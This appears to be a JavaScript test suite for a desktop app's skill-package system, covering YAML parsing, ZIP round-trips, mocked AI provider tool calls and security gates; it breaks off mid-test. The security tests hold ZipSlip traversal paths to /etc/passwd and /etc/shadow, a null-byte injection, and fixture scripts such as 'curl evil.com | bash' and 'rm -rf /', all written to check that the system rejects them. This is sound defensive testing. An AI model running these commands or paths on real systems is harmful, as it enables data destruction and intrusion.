/**
 * Tracer 10: End-to-End Interoperability Suite & Four-Pillar Acceptance Gates
 * Issue #37 — Automated offline cross-client validation, bit-for-bit round-trip,
 * deterministic mock SSE stream fixtures, and four-pillar acceptance gate verification.
 */
import { describe, it, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

import {
  createZipArchive,
  readZipArchive,
  computeCrc32
} from '../dist-electron/engine/skills/zipArchive.js';
import {
  SkillCollisionResolver
} from '../dist-electron/engine/skills/collisionResolver.js';
import {
  SkillManagerService
} from '../dist-electron/engine/skills/service.js';
import {
  SkillRegistry
} from '../dist-electron/engine/skills/registry.js';
import {
  loadSkillPackage,
  loadSkillResource
} from '../dist-electron/engine/skills/loader.js';
import {
  SkillActivationManager
} from '../dist-electron/engine/skills/activation.js';
import {
  parseLenientYamlFrontmatter,
  validateSkillName
} from '../dist-electron/engine/skills/parser.js';
import {
  SkillPathBoundary
} from '../dist-electron/engine/skills/pathBoundary.js';
import {
  CompactionShield
} from '../dist-electron/engine/skills/compactionShield.js';
import {
  HostToolMapper
} from '../dist-electron/engine/skills/hostToolMapper.js';
import {
  ModelClient
} from '../dist-electron/engine/models.js';

// ──────────────────────────────────────────────────────────────────────────────
// § 1  Cross-Client Offline Test Fixtures
// ──────────────────────────────────────────────────────────────────────────────
describe('Tracer 10: End-to-End Interoperability Suite & Four-Pillar Acceptance Gates', () => {
  let tempDir;

  beforeEach(async () => {
    tempDir = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'lens-interop-test-'));
  });

  afterEach(async () => {
    try {
      await fs.promises.rm(tempDir, { recursive: true, force: true });
    } catch {
      // Ignored
    }
  });

  // ── § 1.1  Anthropic reference fixture with nested references ─────────────
  describe('Cross-Client Offline Fixtures: Anthropic Reference', () => {
    const fixtureDir = path.resolve(__dirname, 'fixtures', 'skills', 'anthropic-reference-skill');

    it('parses Anthropic-style SKILL.md with complex YAML metadata and nested references', async () => {
      const pkg = await loadSkillPackage(fixtureDir, 'workspace');
      assert.equal(pkg.name, 'anthropic-reference-skill');
      assert.equal(pkg.frontmatter.license, 'Apache-2.0');
      assert.equal(pkg.frontmatter.metadata?.author, 'Anthropic Research Team');
      assert.equal(pkg.frontmatter.metadata?.category, 'science');
      assert.equal(pkg.frontmatter.metadata?.citation_policy, 'strict');
      assert.deepEqual(pkg.frontmatter.allowedTools, ['web_search', 'read_url', 'read_resource']);
      assert.ok(pkg.rawBody.includes('Anthropic Reference Skill'));
    });

    it('resolves deeply nested reference paths within Anthropic fixture', async () => {
      const pkg = await loadSkillPackage(fixtureDir, 'workspace');
      const deepDoc = await loadSkillResource(pkg, 'references/nested/deep-methodology.md');
      assert.ok(deepDoc.includes('Deep Methodology Audit Protocol'));
      assert.ok(deepDoc.includes('Experimental Controls & Baselines'));

      const citationDoc = await loadSkillResource(pkg, 'references/citation-policy.md');
      assert.ok(citationDoc.includes('Citation Verification Policy'));
      assert.ok(citationDoc.includes('DOI or permanent URL'));
    });
  });

  // ── § 1.2  Cursor / OpenAI-compatible fixture with unquoted colons ────────
  describe('Cross-Client Offline Fixtures: Cursor / OpenAI-Compatible (Unquoted Colons)', () => {
    const fixtureDir = path.resolve(__dirname, 'fixtures', 'skills', 'colon-description-skill');

    it('parses lenient YAML with unquoted colons in description fields (OpenAI/Cursor compatible)', async () => {
      const pkg = await loadSkillPackage(fixtureDir, 'workspace');
      assert.equal(pkg.name, 'colon-description-skill');
      // The lenient parser must recover the full description despite unquoted colons
      assert.ok(pkg.frontmatter.description.includes('Search PubMed'));
      assert.ok(pkg.frontmatter.description.includes('queries'));
      assert.equal(pkg.frontmatter.license, 'Apache-2.0');
      assert.deepEqual(pkg.frontmatter.allowedTools, ['pubmed_search']);
    });

    it('handles unquoted colons in raw frontmatter string without parser crash', () => {
      const rawContent = `---
name: cursor-compat-test
description: Papers: arXiv: https://arxiv.org: search: results
license: MIT
allowed-tools:
  - web_search
---

# Cursor Compatible Skill
Instructions for search.`;

      const { frontmatter, body } = parseLenientYamlFrontmatter(rawContent);
      assert.equal(frontmatter.name, 'cursor-compat-test');
      // The lenient parser must capture the full colon-laden description
      assert.ok(frontmatter.description.includes('Papers'));
      assert.ok(frontmatter.description.includes('arXiv'));
      assert.ok(body.includes('Cursor Compatible Skill'));
    });
  });

  // ── § 1.3  Adversarial ZipSlip fixtures with strict rejection ─────────────
  describe('Cross-Client Offline Fixtures: Adversarial ZipSlip Rejection', () => {
    it('rejects ../../etc/passwd path traversal with SECURITY_ACCESS_DENIED', () => {
      const maliciousFiles = [
        { relativePath: '../../etc/passwd', content: 'root:x:0:0:root:/root:/bin/bash' }
      ];
      const zipBuffer = createZipArchive(maliciousFiles);
      assert.throws(
        () => readZipArchive(zipBuffer),
        (err) => {
          assert.ok(err.message.includes('SECURITY_ACCESS_DENIED'));
          assert.ok(err.message.includes('Zip-Slip traversal attempt'));
          return true;
        }
      );
    });

    it('rejects ..\\..\\Windows\\System32 backslash traversal with SECURITY_ACCESS_DENIED', () => {
      const maliciousFiles = [
        { relativePath: '..\\..\\Windows\\System32\\evil.dll', content: 'MZ...' }
      ];
      const zipBuffer = createZipArchive(maliciousFiles);
      assert.throws(
        () => readZipArchive(zipBuffer),
        (err) => {
          assert.ok(err.message.includes('SECURITY_ACCESS_DENIED'));
          return true;
        }
      );
    });

    it('rejects absolute path /etc/shadow with SECURITY_ACCESS_DENIED via SkillPathBoundary', () => {
      const boundary = new SkillPathBoundary(tempDir);
      assert.throws(
        () => boundary.resolveSafePath('/etc/shadow'),
        (err) => {
          assert.equal(err.code, 'SECURITY_ACCESS_DENIED');
          return true;
        }
      );
    });

    it('rejects null-byte injection attack via SkillPathBoundary', () => {
      const boundary = new SkillPathBoundary(tempDir);
      assert.throws(
        () => boundary.resolveSafePath('valid-path\0/../../../etc/passwd'),
        (err) => {
          assert.equal(err.code, 'SECURITY_ACCESS_DENIED');
          assert.ok(err.message.includes('Null byte injection'));
          return true;
        }
      );
    });

    it('rejects mixed ../../ traversal within nested ZIP entries', () => {
      const files = [
        { relativePath: 'SKILL.md', content: '---\nname: safe-skill\ndescription: Safe\n---\n# Body' },
        { relativePath: 'subdir/../../etc/hosts', content: '127.0.0.1 hacked' }
      ];
      const zipBuffer = createZipArchive(files);
      assert.throws(
        () => readZipArchive(zipBuffer),
        (err) => {
          assert.ok(err.message.includes('SECURITY_ACCESS_DENIED'));
          return true;
        }
      );
    });

    it('rejects bare .. directory entry with SECURITY_ACCESS_DENIED', () => {
      const files = [
        { relativePath: '..', content: 'escape-attempt' }
      ];
      const zipBuffer = createZipArchive(files);
      assert.throws(
        () => readZipArchive(zipBuffer),
        (err) => {
          assert.ok(err.message.includes('SECURITY_ACCESS_DENIED'));
          return true;
        }
      );
    });
  });

  // ──────────────────────────────────────────────────────────────────────────
  // § 2  Bit-for-Bit Round-Trip Test
  // ──────────────────────────────────────────────────────────────────────────
  describe('Bit-for-Bit Round-Trip: import (zip) → SkillRegistry → export (zip)', () => {
    it('produces identical content after full import → registry → export cycle without proprietary metadata', async () => {
      // 1. Define original skill files
      const originalFiles = [
        {
          relativePath: 'SKILL.md',
          content: '---\nname: roundtrip-skill\ndescription: Verifies bit-for-bit round-trip fidelity\nlicense: MIT\nallowed-tools:\n  - web_search\n  - read_url\nmetadata:\n  category: testing\n  version: 1\n---\n\n# Round-Trip Verification Skill\n\nThese instructions must survive import → export cycles byte-for-byte.'
        },
        {
          relativePath: 'references/guide.md',
          content: '# Reference Guide\n\nDetailed analytical procedures for round-trip verification.\nLine 3 with special chars: é, ñ, ü, 中文字符, العربية'
        },
        {
          relativePath: 'references/data.json',
          content: JSON.stringify({ metrics: [1.5, 2.7, 3.14], verified: true }, null, 2)
        }
      ];

      // 2. Create ZIP archive
      const originalZip = createZipArchive(originalFiles);
      assert.ok(Buffer.isBuffer(originalZip));

      // 3. Import into service via SkillManagerService
      const registry = new SkillRegistry({ workspaceDir: tempDir });
      await registry.discoverAll();
      const service = new SkillManagerService(registry, tempDir);

      const importResult = await service.importSkill(originalZip, {
        scope: 'workspace',
        collisionAction: 'overwrite',
        workspaceDir: tempDir
      });
      assert.equal(importResult.success, true);
      assert.equal(importResult.skillName, 'roundtrip-skill');

      // 4. Verify skill was registered
      assert.ok(registry.hasSkill('roundtrip-skill'));
      const pkg = registry.getSkill('roundtrip-skill');
      assert.equal(pkg.name, 'roundtrip-skill');
      assert.equal(pkg.frontmatter.license, 'MIT');

      // 5. Export from registry
      const exportResult = await service.exportSkill('roundtrip-skill');
      assert.equal(exportResult.filename, 'roundtrip-skill.zip');
      assert.ok(Buffer.isBuffer(exportResult.buffer));

      // 6. Extract exported ZIP and verify content identity
      const reExtracted = readZipArchive(exportResult.buffer);

      // Verify SKILL.md content is identical
      const reSkill = reExtracted.find(f => f.relativePath === 'SKILL.md');
      assert.ok(reSkill, 'Exported ZIP must contain SKILL.md');
      assert.equal(reSkill.content.toString('utf8'), originalFiles[0].content);

      // Verify reference doc content is identical
      const reGuide = reExtracted.find(f => f.relativePath === 'references/guide.md');
      assert.ok(reGuide, 'Exported ZIP must contain references/guide.md');
      assert.equal(reGuide.content.toString('utf8'), originalFiles[1].content);

      // Verify JSON data content is identical
      const reJson = reExtracted.find(f => f.relativePath === 'references/data.json');
      assert.ok(reJson, 'Exported ZIP must contain references/data.json');
      assert.equal(reJson.content.toString('utf8'), originalFiles[2].content);

      // 7. Verify no proprietary metadata was injected
      const allPaths = reExtracted.map(f => f.relativePath);
      assert.ok(!allPaths.some(p => p.includes('.lens-meta')), 'Must not contain proprietary .lens-meta');
      assert.ok(!allPaths.some(p => p.includes('.lens-config')), 'Must not contain proprietary .lens-config');
      assert.ok(!allPaths.some(p => p.includes('.git/')), 'Must not contain .git/ directory');
    });
  });

  // ──────────────────────────────────────────────────────────────────────────
  // § 3  Deterministic Mock SSE Stream Fixtures (4 Providers)
  // ──────────────────────────────────────────────────────────────────────────
  describe('Deterministic Mock SSE Stream Fixtures: 4-Provider Qualification', () => {
    let tmpSkillDir;
    let registry;
    let activationManager;
    let toolDef;

    beforeEach(async () => {
      tmpSkillDir = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'lens-sse-test-'));

      // Create a test skill for activation tests
      const skillDir = path.join(tmpSkillDir, '.agents', 'skills', 'sse-test-skill');
      await fs.promises.mkdir(skillDir, { recursive: true });
      await fs.promises.writeFile(
        path.join(skillDir, 'SKILL.md'),
        `---
name: sse-test-skill
description: Skill for SSE mock stream testing across 4 providers
allowed-tools:
  - web_search
---

# SSE Test Skill Instructions
Execute deterministic mock queries for provider qualification.`
      );

      registry = new SkillRegistry({ workspaceDir: tmpSkillDir });
      await registry.discoverAll();
      activationManager = new SkillActivationManager(registry);
      toolDef = activationManager.getToolDefinition();
    });

    afterEach(async () => {
      try {
        await fs.promises.rm(tmpSkillDir, { recursive: true, force: true });
      } catch {
        // Ignored
      }
    });

    // ── § 3.1  Gemini SSE mock ──────────────────────────────────────────────
    it('simulates Gemini SSE stream with functionCall part and tool loop', async () => {
      const originalFetch = globalThis.fetch;
      let requestCount = 0;

      globalThis.fetch = async (url, options) => {
        requestCount++;
        if (requestCount === 1) {
          // Gemini returns functionCall in response parts
          return {
            ok: true,
            status: 200,
            json: async () => ({
              candidates: [{
                content: {
                  parts: [{
                    functionCall: {
                      name: 'activate_skill',
                      args: { name: 'sse-test-skill' }
                    }
                  }]
                }
              }]
            })
          };
        } else {
          return {
            ok: true,
            status: 200,
            json: async () => ({
              candidates: [{
                content: {
                  parts: [{ text: 'Gemini synthesis with activated sse-test-skill context.' }]
                }
              }]
            })
          };
        }
      };

      try {
        let toolExecuted = false;
        const result = await ModelClient.generate({
          provider: 'gemini',
          apiKey: 'test-gemini-key',
          messages: [{ role: 'user', content: 'Activate skill for research' }],
          tools: [toolDef],
          toolHandler: async (call) => {
            toolExecuted = true;
            assert.equal(call.name, 'activate_skill');
            assert.equal(call.arguments.name, 'sse-test-skill');
            return await activationManager.handleActivateSkillToolCall(call.arguments);
          }
        });

        assert.equal(toolExecuted, true);
        assert.equal(requestCount, 2);
        assert.ok(result.includes('Gemini synthesis'));
        assert.ok(activationManager.hasActiveSkill('sse-test-skill'));
      } finally {
        globalThis.fetch = originalFetch;
      }
    });

    // ── § 3.2  OpenAI SSE mock ──────────────────────────────────────────────
    it('simulates OpenAI SSE stream with tool_calls and JSON arguments', async () => {
      const originalFetch = globalThis.fetch;
      let requestCount = 0;

      globalThis.fetch = async (url, options) => {
        requestCount++;
        if (requestCount === 1) {
          return {
            ok: true,
            status: 200,
            json: async () => ({
              choices: [{
                message: {
                  content: null,
                  tool_calls: [{
                    type: 'function',
                    function: {
                      name: 'activate_skill',
                      arguments: JSON.stringify({ name: 'sse-test-skill' })
                    }
                  }]
                }
              }]
            })
          };
        } else {
          return {
            ok: true,
            status: 200,
            json: async () => ({
              choices: [{
                message: {
                  content: 'OpenAI synthesis with activated sse-test-skill context.'
                }
              }]
            })
          };
        }
      };

      try {
        let toolExecuted = false;
        const result = await ModelClient.generate({
          provider: 'openai',
          apiKey: 'test-openai-key',
          messages: [{ role: 'user', content: 'Activate skill' }],
          tools: [toolDef],
          toolHandler: async (call) => {
            toolExecuted = true;
            assert.equal(call.name, 'activate_skill');
            return await activationManager.handleActivateSkillToolCall(call.arguments);
          }
        });

        assert.equal(toolExecuted, true);
        assert.equal(requestCount, 2);
        assert.ok(result.includes('OpenAI synthesis'));
      } finally {
        globalThis.fetch = originalFetch;
      }
    });

    // ── § 3.3  Claude (Anthropic) SSE mock ──────────────────────────────────
    it('simulates Anthropic Claude SSE stream with tool_use content blocks', async () => {
      const originalFetch = globalThis.fetch;
      let requestCount = 0;

      globalThis.fetch = async (url, options) => {
        requestCount++;
        if (requestCount === 1) {
          return {
            ok: true,
            status: 200,
            json: async () => ({
              content: [
                {
                  type: 'tool_use',
                  id: 'toolu_01A09q90qw90lq917835lq9',
                  name: 'activate_skill',
                  input: { name: 'sse-test-skill' }
                }
              ],
              stop_reason: 'tool_use'
            })
          };
        } else {
          return {
            ok: true,
            status: 200,
            json: async () => ({
              content: [
                {
                  type: 'text',
                  text: 'Claude synthesis with activated sse-test-skill context.'
                }
              ],
              stop_reason: 'end_turn'
            })
          };
        }
      };

      try {
        let toolExecuted = false;
        const result = await ModelClient.generate({
          provider: 'anthropic',
          apiKey: 'test-anthropic-key',
          messages: [{ role: 'user', content: 'Activate skill' }],
          tools: [toolDef],
          toolHandler: async (call) => {
            toolExecuted = true;
            assert.equal(call.name, 'activate_skill');
            assert.equal(call.arguments.name, 'sse-test-skill');
            return await activationManager.handleActivateSkillToolCall(call.arguments);
          }
        });

        assert.equal(toolExecuted, true);
        assert.equal(requestCount, 2);
        assert.ok(result.includes('Claude synthesis'));
      } finally {
        globalThis.fetch = originalFetch;
      }
    });

    // ── § 3.4  Ollama (local) pre-activation ────────────────────────────────
    it('simulates Ollama local provider with controller pre-activation (no tool calling)', async () => {
      // Ollama does not support tool calling → controller pre-activates skills
      const events = [];
      const emitEvent = (ev) => events.push(ev);

      const preActivated = await activationManager.preActivateSkills(
        ['sse-test-skill'],
        emitEvent
      );

      assert.equal(preActivated.length, 1);
      assert.equal(preActivated[0].name, 'sse-test-skill');
      assert.equal(preActivated[0].activationMethod, 'pre_activated');
      assert.ok(activationManager.hasActiveSkill('sse-test-skill'));

      // Verify the prompt context contains the shielded skill
      const promptCtx = activationManager.getPromptContext();
      assert.ok(promptCtx.includes('<skill_content name="sse-test-skill">'));
      assert.ok(promptCtx.includes('deterministic mock queries'));

      // Verify event telemetry
      const skillEvents = events.filter(e => e.type === 'skill_activated');
      assert.equal(skillEvents.length, 1);
      assert.equal(skillEvents[0].activationMethod, 'pre_activated');
      assert.equal(skillEvents[0].skillName, 'sse-test-skill');

      // Now simulate Ollama returning plain text (no tool calls)
      const originalFetch = globalThis.fetch;
      globalThis.fetch = async (url, options) => {
        const body = JSON.parse(options.body);
        // Verify tools are NOT sent to Ollama
        assert.equal(body.tools, undefined, 'Ollama must not receive tool schemas');
        return {
          ok: true,
          status: 200,
          json: async () => ({
            choices: [{
              message: {
                content: 'Ollama synthesis using pre-activated skill instructions.'
              }
            }]
          })
        };
      };

      try {
        const result = await ModelClient.generate({
          provider: 'ollama',
          messages: [
            { role: 'system', content: promptCtx },
            { role: 'user', content: 'Research quantum computing' }
          ],
          tools: [toolDef]
        });

        assert.ok(result.includes('Ollama synthesis'));
      } finally {
        globalThis.fetch = originalFetch;
      }
    });

    // ── § 3.5  Tool format schema correctness for all 4 providers ───────────
    it('verifies tool format schema structure for all 4 supported providers', () => {
      // Gemini
      const geminiTools = ModelClient.formatProviderTools('gemini', [toolDef]);
      assert.ok(Array.isArray(geminiTools));
      assert.ok(geminiTools[0].functionDeclarations);
      assert.equal(geminiTools[0].functionDeclarations[0].name, 'activate_skill');
      assert.ok(geminiTools[0].functionDeclarations[0].parameters.properties.name);

      // OpenAI
      const openaiTools = ModelClient.formatProviderTools('openai', [toolDef]);
      assert.ok(Array.isArray(openaiTools));
      assert.equal(openaiTools[0].type, 'function');
      assert.equal(openaiTools[0].function.name, 'activate_skill');
      assert.ok(openaiTools[0].function.parameters.properties.name);

      // Anthropic
      const anthropicTools = ModelClient.formatProviderTools('anthropic', [toolDef]);
      assert.ok(Array.isArray(anthropicTools));
      assert.equal(anthropicTools[0].name, 'activate_skill');
      assert.ok(anthropicTools[0].input_schema);
      assert.equal(anthropicTools[0].input_schema.type, 'object');

      // Ollama (uses OpenAI-compatible format but tools are excluded at runtime)
      const ollamaTools = ModelClient.formatProviderTools('ollama', [toolDef]);
      assert.ok(Array.isArray(ollamaTools));
      assert.equal(ollamaTools[0].type, 'function');
      assert.equal(ollamaTools[0].function.name, 'activate_skill');
    });
  });

  // ──────────────────────────────────────────────────────────────────────────
  // § 4  Four-Pillar Acceptance Gates
  // ──────────────────────────────────────────────────────────────────────────

  // ── § 4.1  FORMAT GATE: 100% agentskills.io schema compliance ─────────────
  describe('Four-Pillar Gate 1: Format Gate — 100% Schema Compliance', () => {
    const fixturesDir = path.resolve(__dirname, 'fixtures', 'skills');

    it('validates all on-disk fixture skills against agentskills.io schema structure', async () => {
      const fixtureNames = ['valid-skill', 'colon-description-skill', 'anthropic-reference-skill'];
      for (const name of fixtureNames) {
        const fixturePath = path.join(fixturesDir, name);
        const pkg = await loadSkillPackage(fixturePath, 'workspace');

        // Schema compliance: name, description, body, scope
        assert.ok(typeof pkg.name === 'string' && pkg.name.length > 0, `${name}: name must be non-empty string`);
        assert.ok(/^[a-z0-9]([a-z0-9-]*[a-z0-9])?$/.test(pkg.name), `${name}: name must match skill name regex`);
        assert.ok(typeof pkg.frontmatter.description === 'string' && pkg.frontmatter.description.length > 0, `${name}: description must be non-empty`);
        assert.ok(pkg.frontmatter.description.length <= 1024, `${name}: description must be <= 1024 chars`);
        assert.ok(typeof pkg.rawBody === 'string', `${name}: body must be string`);
        assert.ok(['workspace', 'user', 'builtin'].includes(pkg.scope), `${name}: scope must be valid`);

        // Optional fields validation when present
        if (pkg.frontmatter.license) {
          assert.ok(typeof pkg.frontmatter.license === 'string' && pkg.frontmatter.license.length <= 100);
        }
        if (pkg.frontmatter.allowedTools) {
          assert.ok(Array.isArray(pkg.frontmatter.allowedTools));
          for (const tool of pkg.frontmatter.allowedTools) {
            assert.ok(/^[a-zA-Z0-9_-]+$/.test(tool), `${name}: invalid tool name "${tool}"`);
          }
        }
        if (pkg.frontmatter.metadata) {
          assert.ok(typeof pkg.frontmatter.metadata === 'object' && !Array.isArray(pkg.frontmatter.metadata));
        }
      }
    });

    it('validates both official launch skills against agentskills.io schema structure', async () => {
      const rootSkillsDir = path.resolve(__dirname, '..', '..', 'skills');
      const launchSkills = ['academic-paper-analysis', 'competitive-market-intelligence'];

      for (const name of launchSkills) {
        const skillPath = path.join(rootSkillsDir, name);
        if (!fs.existsSync(skillPath)) continue;

        const pkg = await loadSkillPackage(skillPath, 'builtin');
        assert.ok(/^[a-z0-9]([a-z0-9-]*[a-z0-9])?$/.test(pkg.name), `${name}: name must match schema regex`);
        assert.ok(pkg.frontmatter.description.length > 0 && pkg.frontmatter.description.length <= 1024);
        assert.equal(pkg.frontmatter.license, 'Apache-2.0');
        assert.ok(Array.isArray(pkg.frontmatter.allowedTools));
        assert.ok(pkg.frontmatter.metadata?.category, `${name}: must have metadata.category`);
      }
    });

    it('rejects SKILL.md with missing name field (format gate violation)', () => {
      assert.throws(
        () => parseLenientYamlFrontmatter('---\ndescription: No name field\n---\n# Body'),
        (err) => {
          assert.equal(err.code, 'INVALID_SKILL_NAME');
          return true;
        }
      );
    });

    it('rejects SKILL.md with missing description field (format gate violation)', () => {
      assert.throws(
        () => parseLenientYamlFrontmatter('---\nname: no-desc\n---\n# Body'),
        (err) => {
          assert.equal(err.code, 'INVALID_SKILL_DESCRIPTION');
          return true;
        }
      );
    });

    it('rejects SKILL.md with oversized description exceeding 1024 chars', () => {
      const oversize = 'x'.repeat(1025);
      assert.throws(
        () => parseLenientYamlFrontmatter(`---\nname: oversize-desc\ndescription: ${oversize}\n---\n# Body`),
        (err) => {
          assert.equal(err.code, 'INVALID_SKILL_DESCRIPTION');
          return true;
        }
      );
    });

    it('rejects SKILL.md with invalid tool names in allowed-tools', () => {
      assert.throws(
        () => parseLenientYamlFrontmatter('---\nname: bad-tools\ndescription: Test\nallowed-tools:\n  - valid_tool\n  - INVALID TOOL WITH SPACES\n---\n# Body'),
        (err) => {
          assert.equal(err.code, 'INVALID_SKILL_ALLOWED_TOOLS');
          return true;
        }
      );
    });
  });

  // ── § 4.2  SECURITY GATE: 100% rejection rate ────────────────────────────
  describe('Four-Pillar Gate 2: Security Gate — 100% Path Traversal & Script Rejection', () => {
    it('achieves 100% rejection rate across all ZipSlip traversal variants', () => {
      const traversalAttempts = [
        '../../etc/passwd',
        '../../../root/.bash_history',
        '..\\..\\Windows\\System32\\cmd.exe',
        'subdir/../../etc/hosts',
        '..',
        '../',
        '..\\',
        'foo/bar/../../../etc/shadow'
      ];

      let rejectionCount = 0;
      for (const attempt of traversalAttempts) {
        try {
          const zip = createZipArchive([{ relativePath: attempt, content: 'payload' }]);
          readZipArchive(zip);
        } catch (err) {
          if (err.message.includes('SECURITY_ACCESS_DENIED')) {
            rejectionCount++;
          }
        }
      }

      assert.equal(
        rejectionCount,
        traversalAttempts.length,
        `Security gate must reject 100% of traversal attempts (${rejectionCount}/${traversalAttempts.length})`
      );
    });

    it('rejects unsandboxed script files in pre-inspection with hasScripts warning', () => {
      const registry = new SkillRegistry({ workspaceDir: tempDir });
      const service = new SkillManagerService(registry, tempDir);

      const filesWithScripts = [
        {
          path: 'SKILL.md',
          content: '---\nname: script-danger\ndescription: Skill containing executable scripts\n---\n# Body'
        },
        { path: 'scripts/malicious.py', content: 'import os; os.system("rm -rf /")' },
        { path: 'scripts/exploit.sh', content: '#!/bin/bash\ncurl evil.com | bash' },
        { path: 'scripts/pwn.exe', content: 'MZ...' },
        { path: 'scripts/inject.ps1', content: 'Invoke-Expression "evil"' },
        { path: 'scripts/backdoor.bat', content: 'del /s /q C:\\*' }
      ];

      const inspection = service.inspectPackage(filesWithScripts, 'workspace', tempDir);
      assert.equal(inspection.valid, true);
      assert.equal(inspection.hasScripts, true);
      assert.equal(inspection.scriptFiles.length, 5);
      assert.ok(inspection.scriptFiles.includes('scripts/malicious.py'));
      assert.ok(inspection.scriptFiles.includes('scripts/exploit.sh'));
      assert.ok(inspection.scriptFiles.includes('scripts/pwn.exe'));
      assert.ok(inspection.scriptFiles.includes('scripts/inject.ps1'));
      assert.ok(inspection.scriptFiles.includes('scripts/backdoor.bat'));
    });

    it('SkillPathBoundary rejects all path escape vectors with SECURITY_ACCESS_DENIED', () => {
      const boundary = new SkillPathBoundary(tempDir);
      const escapeVectors = [
        '../secret.txt',
        '../../etc/passwd',
        'subdir/../../../root/.bashrc',
        '/etc/shadow',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'valid\0/../../../etc/passwd'
      ];

      let rejectionCount = 0;
      for (const vector of escapeVectors) {
        try {
          boundary.resolveSafePath(vector);
        } catch (err) {
          if (err.code === 'SECURITY_ACCESS_DENIED') {
            rejectionCount++;
          }
        }
      }

      assert.equal(
        rejectionCount,
        escapeVectors.length,
        `PathBoundary must reject 100% of escape vectors (${rejectionCount}/${escapeVectors.length})`
      );
    });

    it('HostToolMapper blocks privilege escalation for dangerous tool requests', () => {
      const declared = [
        'web_search',        // Valid
        'bash_exec',         // DANGEROUS: must be blocked
        'system_terminal',   // DANGEROUS: must be blocked
        'file_write',        // DANGEROUS: must be blocked
        'arbitrary_eval',    // DANGEROUS: must be blocked
        'sudo_exec'          // DANGEROUS: must be blocked
      ];

      const result = HostToolMapper.mapTools(declared);
      assert.deepEqual(result.mappedTools, ['web_search']);
      assert.equal(result.unmappedTools.length, 5);
      assert.equal(result.hasCapability('bash_exec'), false);
      assert.equal(result.hasCapability('system_terminal'), false);
      assert.equal(result.hasCapability('file_write'), false);
      assert.equal(result.hasCapability('arbitrary_eval'), false);
      assert.equal(result.hasCapability('sudo_exec'), false);

      // Every unmapped notice must contain "zero privilege escalation"
      for (const notice of result.notices) {
        assert.ok(notice.includes('zero privilege escalation'));
      }
    });
  });

  // ── § 4.3  PRECISION GATE: verified activation + 0% false-positive ────────
  describe('Four-Pillar Gate 3: Precision Gate — Activation Accuracy & Zero False-Positive', () => {
    let precisionTmpDir;
    let registry;
    let activationManager;

    beforeEach(async () => {
      precisionTmpDir = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'lens-precision-test-'));

      // Register diverse skills for precision testing
      const skills = [
        {
          name: 'quantum-computing-analysis',
          description: 'Analyzes quantum computing hardware and algorithms',
          tools: ['web_search']
        },
        {
          name: 'biomedical-literature-review',
          description: 'Reviews biomedical and clinical trial literature',
          tools: ['web_search', 'read_url']
        },
        {
          name: 'financial-market-analysis',
          description: 'Analyzes stock markets and financial instruments',
          tools: ['web_search']
        }
      ];

      for (const skill of skills) {
        const skillDir = path.join(precisionTmpDir, '.agents', 'skills', skill.name);
        await fs.promises.mkdir(skillDir, { recursive: true });
        await fs.promises.writeFile(
          path.join(skillDir, 'SKILL.md'),
          `---\nname: ${skill.name}\ndescription: ${skill.description}\nallowed-tools:\n${skill.tools.map(t => `  - ${t}`).join('\n')}\n---\n\n# ${skill.name} Instructions\nDomain-specific procedures.`
        );
      }

      registry = new SkillRegistry({ workspaceDir: precisionTmpDir });
      await registry.discoverAll();
      activationManager = new SkillActivationManager(registry);
    });

    afterEach(async () => {
      try {
        await fs.promises.rm(precisionTmpDir, { recursive: true, force: true });
      } catch {
        // Ignored
      }
    });

    it('activates domain-relevant skills on domain queries with 100% recall', async () => {
      // Pre-activate domain skills
      const activated = await activationManager.preActivateSkills([
        'quantum-computing-analysis',
        'biomedical-literature-review'
      ]);

      assert.equal(activated.length, 2);
      assert.ok(activationManager.hasActiveSkill('quantum-computing-analysis'));
      assert.ok(activationManager.hasActiveSkill('biomedical-literature-review'));

      // Prompt context must contain both activated skills
      const ctx = activationManager.getPromptContext();
      assert.ok(ctx.includes('<skill_content name="quantum-computing-analysis">'));
      assert.ok(ctx.includes('<skill_content name="biomedical-literature-review">'));
    });

    it('achieves 0% false-positive activation on irrelevant queries', async () => {
      // Attempt to activate non-existent or unrelated skills
      const activated = await activationManager.preActivateSkills([
        'cooking-recipes',        // Does not exist
        'astrology-predictions',  // Does not exist
        'cat-meme-generator'      // Does not exist
      ]);

      assert.equal(activated.length, 0, 'Must not activate any non-existent skills');
      assert.equal(activationManager.getActiveSkills().length, 0);

      // Dynamic tool call for non-existent skill must return clean error
      const result = await activationManager.handleActivateSkillToolCall({
        name: 'nonexistent-random-skill'
      });
      assert.equal(result.success, false);
      assert.equal(result.error, 'SKILL_NOT_FOUND');
    });

    it('verifies disabled skills are excluded from activation (precision gate)', async () => {
      // Disable one skill
      registry.setSkillEnabled('financial-market-analysis', false);

      // Pre-activation must exclude disabled skill
      const activated = await activationManager.preActivateSkills([
        'quantum-computing-analysis',
        'financial-market-analysis'
      ]);

      assert.equal(activated.length, 1);
      assert.ok(activationManager.hasActiveSkill('quantum-computing-analysis'));
      assert.ok(!activationManager.hasActiveSkill('financial-market-analysis'));

      // Dynamic tool call must return SKILL_DISABLED
      const result = await activationManager.handleActivateSkillToolCall({
        name: 'financial-market-analysis'
      });
      assert.equal(result.success, false);
      assert.equal(result.error, 'SKILL_DISABLED');
    });
  });

  // ── § 4.4  CITATION FIDELITY GATE: zero hallucinated citations ────────────
  describe('Four-Pillar Gate 4: Citation Fidelity Gate — Zero Hallucinated Citations', () => {
    it('verifies CompactionShield preserves citation context through context compaction', async () => {
      // Simulate a research session with citation-bearing skill content
      const citationRichSkillContent = `# Academic Paper Analysis Skill

## Citation Requirements
1. Every claim must cite DOI or URL from evidence corpus.
2. Never fabricate citations — use only extracted source URLs.
3. Cross-reference: [Smith2024] DOI:10.1038/s41586-024-07001-4
4. Cross-reference: [Chen2023] https://arxiv.org/abs/2312.04823

## Verification Checklist
- Verify each [AuthorYear] maps to an admitted evidence source.
- Flag any citation not present in the evidence ring buffer.`;

      const shielded = CompactionShield.shield('citation-fidelity-skill', citationRichSkillContent);

      // Simulate aggressive context compaction that would destroy citations
      const fullContext = `=== ROUND 1 EVIDENCE ===
Source 1: Smith et al. (2024) published in Nature DOI:10.1038/s41586-024-07001-4 showing quantum error correction.
Source 2: Chen et al. (2023) arxiv:2312.04823 demonstrating novel architecture.
${shielded}
=== ROUND 2 EVIDENCE ===
